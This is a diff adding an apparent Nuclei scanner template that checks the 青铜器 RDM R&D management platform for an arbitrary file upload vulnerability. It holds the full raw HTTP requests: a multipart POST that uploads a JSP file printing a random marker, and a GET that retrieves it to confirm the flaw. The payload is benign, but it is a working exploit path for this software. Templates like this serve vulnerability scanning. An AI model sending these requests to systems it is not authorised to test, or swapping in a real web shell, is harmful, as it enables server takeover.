@@ -1,0 +1,45 @@
+id: qingtonqi-rdm-upload-arbitrary-file-upload
+
+info:
+  name: 青铜器RDM研发管理平台 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    青铜器RDM研发管理平台存在一个任意文件上传漏洞，攻击者可以利用该漏洞上传恶意文件，导致服务器被控制。
+  remediation: |
+    应立即修补此漏洞，确保上传功能仅允许上传合法文件类型，并实施严格的文件验证和访问控制。
+  tags: 青铜器RDM研发管理平台
+  
+http:
+  - raw:
+      - |
+        POST /upload?dir=cmVwb3NpdG9yeQ==&name=ZGVtby5qc3A=&start=0&size=7000 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=00content0boundary00
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Connection: close
+
+        --00content0boundary00
+        Content-Disposition: form-data; name="file"; filename="poc.jsp"
+        Content-Type: application/octet-stream
+        
+        <%out.println("{{randstr}}");%>
+        --00content0boundary00
+        Content-Disposition: form-data; name="Submit"
+
+        Go
+        --00content0boundary00--
+
+  - raw:
+      - |
+        GET /repository/000000000/demo.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200
+          - status_code_2 == 200
+          - contains(body_2,"{{randstr}}")
+        condition: and
